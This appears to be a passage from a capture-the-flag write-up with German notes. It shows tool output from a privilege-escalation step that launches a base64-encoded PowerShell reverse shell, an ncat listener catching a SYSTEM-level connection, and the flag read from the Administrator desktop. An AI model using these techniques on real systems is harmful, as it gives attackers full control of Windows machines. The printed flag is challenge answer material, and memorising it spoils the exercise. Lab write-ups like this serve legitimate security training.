[+] Current Command Length: 10 characters
---
[+] Creating a simple PowerShell reverse shell...
[+] IP Address: 10.0.52.31 | Port: 9003
[+] Bootstrapping to an environment variable...
[+] Payload base64 encoded and set to local environment variable: '$env:SigmaBootstrap'
[+] Environment block inherited local environment variables.
[+] New Command to Execute: 'powershell -c (powershell -e $env:SigmaBootstrap)'
[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.
---
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 4112

[+] Process Output:


```

jetzt 2te ncat session starten

```
cassandra@casino:/tmp/bumble$ ./ncat -lvnp 9003
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::9003
Ncat: Listening on 0.0.0.0:9003
Ncat: Connection from 10.0.52.2.
Ncat: Connection from 10.0.52.2:60683.

idPS C:\Windows\system32  
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cd c:\users
PS C:\users> cd Administrator
PS C:\users\Administrator> cd Desktop
PS C:\users\Administrator\Desktop> dir


    Directory: C:\users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        11/6/2023   8:03 AM             59 flag.txt                                                              


PS C:\users\Administrator\Desktop> type flag.txt
FHS{wh0_w0uld_h4v3_th0ught_th3_d0g_w0uld_d0_s0_much_d4m4g3}
PS C:\users\Administrator\Desktop> 
```

Flag7

FHS{wh0_w0uld_h4v3_th0ught_th3_d0g_w0uld_d0_s0_much_d4m4g3}